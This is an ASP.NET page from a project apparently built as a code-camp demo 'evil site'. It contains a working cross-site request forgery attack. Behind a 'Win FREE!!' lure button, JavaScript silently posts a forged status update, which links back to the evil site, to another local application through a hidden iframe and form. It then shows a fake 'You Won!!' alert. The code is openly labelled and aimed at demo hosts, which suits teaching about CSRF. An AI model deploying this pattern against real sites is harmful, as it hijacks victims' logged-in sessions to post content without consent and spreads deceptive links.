<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="CSRF.aspx.cs" Inherits="XSSEvilSite.Default" %>

<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" runat="server">

    <script type="text/javascript">
        // Let's create the iFrame used to send our data
        var iframe = document.createElement("iframe");
        iframe.name = "myTarget";

        function doCSRFAttach() {
            var params = {};
            params.Status = 'Hey, check this awesome page! - <a href="http://codecamp.local/EvilSite/">Awesome site</a>';
            postDataToUrl('http://codecamp.local/CSRFStatusUpdate/', params);

            alert('You Won!!');
            return false;
        }

        // Next, attach the iFrame to the main document
        window.addEventListener("load", function () {
            iframe.style.display = "none";
            document.body.appendChild(iframe);
        });

        // This is the function used to actually send the data
        // It takes one parameter, which is an object populated with key/value pairs.
        function postDataToUrl(url, data) {
            var name,
                form = document.createElement("form"),
                node = document.createElement("input");

            // Define what should happen when the response is loaded
            iframe.addEventListener("load", function () {
                // SENT!
            });

            form.method = 'POST';
            form.action = url;
            form.target = iframe.name;

            for (name in data) {
                node.name = name;
                node.value = data[name].toString();
                form.appendChild(node.cloneNode());
            }

            // To be sent, the form needs to be attached to the main document.
            form.style.display = "none";
            document.body.appendChild(form);

            form.submit();

            // But once the form is sent, it's useless to keep it.
            document.body.removeChild(form);
        }

    </script>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="FeaturedContent" runat="server">
</asp:Content>
<asp:Content ID="Content3" ContentPlaceHolderID="MainContent" runat="server">
    <h1>Click on the button! <strong style="color: red">I will CSRF your status.</strong> </h1>

    <input type="button" value="Win FREE!!" onclick="doCSRFAttach()" />
</asp:Content>
